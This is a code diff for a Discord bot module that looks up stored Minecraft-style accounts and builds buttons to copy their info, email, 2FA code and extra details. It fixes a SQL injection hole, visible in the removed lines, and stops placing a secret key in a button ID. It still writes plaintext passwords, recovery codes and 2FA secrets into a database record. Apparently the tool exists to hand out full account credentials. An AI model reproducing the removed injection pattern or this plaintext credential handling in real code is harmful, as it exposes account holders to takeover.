@@ -56,8 +56,11 @@ module.exports = async (id, current, uid = null) => {
             return msg;
         }
 
-        let userAccountsQuery = `SELECT * FROM accounts WHERE uid IN (${userUIDs.map(u => `'${u.uid}'`).join(', ')})`;
-        userAccounts = await queryParams(userAccountsQuery);
+        const placeholders = userUIDs.map(() => '?').join(', ');
+        userAccounts = await queryParams(
+            `SELECT * FROM accounts WHERE uid IN (${placeholders})`,
+            userUIDs.map(u => u.uid)
+        );
     }
 
     if (!userAccounts || userAccounts.length === 0) {
@@ -305,7 +308,7 @@ module.exports = async (id, current, uid = null) => {
     let copyTextId = generate(32);
     await queryParams(
         "INSERT INTO actions(id, action) VALUES(?, ?)",
-        [copyTextId, `copyText|${currentAccount.username}|${currentAccount.ownsmc}|${currentAccount.capes}|${currentAccount.recoverycode}|${currentAccount.email}|${currentAccount.secemail}|${currentAccount.secretkey}|${currentAccount.password}`]
+        [copyTextId, `copyText|${id}|${currentAccount.username}|${currentAccount.ownsmc}|${currentAccount.capes}|${currentAccount.recoverycode}|${currentAccount.email}|${currentAccount.secemail}|${currentAccount.secretkey}|${currentAccount.password}`]
     );
 
     const sortingLabels = {
@@ -339,15 +342,15 @@ module.exports = async (id, current, uid = null) => {
             .setLabel("Copy Info")
             .setStyle(ButtonStyle.Secondary),
         new ButtonBuilder()
-            .setCustomId(`email|${currentAccount.secemail}`)
+            .setCustomId(`email|${id}|${currentAccount.secemail}`)
             .setStyle(ButtonStyle.Secondary)
             .setEmoji({ name: "📧" }),
         new ButtonBuilder()
-            .setCustomId(`auth|${currentAccount.secretkey && currentAccount.secretkey.replace(/\s+/g, '').length > 4 ? currentAccount.secretkey.replace(/\s+/g, '') : '0'}`)
+            .setCustomId(`auth|${id}|${currentAccount.uid}`)
             .setStyle(ButtonStyle.Secondary)
             .setEmoji({ name: "🔑" }),
         new ButtonBuilder()
-            .setCustomId(`extrainformation|${currentAccount.uid}`)
+            .setCustomId(`extrainformation|${id}|${currentAccount.uid}`)
             .setLabel("Extra Information")
             .setStyle(ButtonStyle.Success)
     );
